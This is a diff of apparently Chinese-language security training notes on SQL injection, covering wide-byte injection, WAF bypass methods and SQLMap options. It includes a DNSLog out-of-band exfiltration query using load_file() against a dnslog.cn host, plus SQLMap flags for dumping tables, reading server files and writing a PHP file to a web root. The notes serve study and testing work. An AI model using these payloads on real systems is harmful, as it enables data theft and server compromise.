@@ -885,14 +885,9 @@ update users set passwd='ccc'and payload # ' where username="xxx"
    用concat函数构造dnslog的域名,用select load_file()
 
    ```mysql
-   select load_file("\\\\test.xkpb07.dnslog.cn\\aa");#xkpb07.dnslog.cn是在dnslog生成的三级域名,可以使用concat将要查询的内容放到第四级域名,如果数据库用户有文件读写权限,则可以将查询内容带到dnslog.cn上面
-   
-```
-   
-   
-
-
-
+   select load_file("\\\\test.xkpb07.dnslog.cn\\aa");
+   #xkpb07.dnslog.cn是在dnslog生成的三级域名,可以使用concat将要查询的内容放到第四级域名,如果数据库用户有文件读写权限,则可以将查询内容带到dnslog.cn上面
+   ```
 ## 宽字节注入:
 
 如果后端将前端传回的特殊符号全部进行处理，在闭合符等特殊符号前添加了反斜杠\将特殊符号全部转义成了普通的符号，此时注入语句中添加的闭合符就会失效，导致注入语句被当成字符串处理。如果后端使用了GBK编码，这种情况就可以使用宽字节注入。
@@ -903,10 +898,8 @@ update users set passwd='ccc'and payload # ' where username="xxx"
 
 2. 宽字节注入的原理:
 
-   ```
    西欧字母符号,通过1个字节表示
    东亚字符则通过至少两个字节来表示。GBK编码就是用两个字节来表示中文区字符的一个编码标准。其编码范围：8140-FEFE（高位字节从81到FE，低位字节从40到FE）。
-   ```
 
    编码转换存在着单字符被合并的情况：
 
@@ -945,16 +938,30 @@ select * from t_xxx where c_xx like '%xx注入点'
   - 16进制编码绕过
   - unhex绕过
   - to_base64(),from_base64():MySQL5.6以后支持
+  
 - 过滤绕过
+
 - 大小写绕过
+
 - 内外双写绕过
+
 - 内联注释绕过
+
 - %00等空白符嵌入绕过WAF
+
 - 超大数据包绕过
+
 - 双提交绕过
+
 - 异常请求方法绕过
 
-### 更多绕过姿势见"C:\Users\HE\tools\secNote\笔记\二阶段\Day30--SQL注入\SQLi绕过姿势整理.md"
+  Seay /1.php?id=1 and 1=1 HTTP/1.1
+  Host: www.cnseay.com
+  Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
+  Accept-Encoding: gzip, deflate
+  Connection: keep-alive
+
+### 详细绕过姿势见"C:\Users\HE\tools\secNote\笔记\二阶段\Day30--SQL注入\SQLi绕过姿势整理.md"
 
 ## SQLMap
 
@@ -969,7 +976,7 @@ select * from t_xxx where c_xx like '%xx注入点'
 
 ### SQLMap的各个选项的作用
 
-- --level	探测登记,数值越高,等级越高,默认为1。在不确定哪个payload或者参数是注入点的时候，可以使用--level 2，此等级会弹出cookie。--level 3 会探测user-agent和referer头
+- --level	探测登记,数值越高,等级越高,默认为1。在不确定哪个payload或者参数是注入点的时候，可以使用--level 2，此等级会探测cookie。--level 3 会探测user-agent和referer头
 
 - -r test.txt   请求头注入
 
@@ -1013,11 +1020,11 @@ select * from t_xxx where c_xx like '%xx注入点'
 
 - --columns -T "表名" -D "数据库" //获取表的列名
 
-- --dump -C "字段,字段" -T "表名" -D "数据库" //获取表中的数据，包含列
+- --dump -C "字段1,字段2,..." -T "表名" -D "数据库" //获取表中指定列的数据，
 
 - --file-read="c: /123.txt" 读文件 （前提是知道绝对路径）
 
-- --file-write="c:sql.txt" --file-dest="E:/Web/site/8.php" 写文件 （前提同样要知道绝对路径）
+- --file-write="c:\sql.txt" --file-dest="E:/Web/site/8.php" 写文件(将本地C:\1.txt 写入到服务器端E:/Web/site/8.php) （前提同样要知道绝对路径）
 
 - --sql-shell 获取sql-shell,但是只能执行select命令
 
